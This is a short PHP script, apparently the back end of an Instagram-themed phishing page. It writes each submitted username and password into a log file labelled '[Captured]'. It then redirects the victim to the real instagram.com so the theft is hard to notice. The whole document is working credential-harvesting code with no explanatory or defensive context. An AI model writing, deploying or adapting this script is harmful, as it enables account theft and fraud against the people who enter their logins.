<?php
file_put_contents("log.txt", "[Captured] Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://instagram.com");
exit();
?>
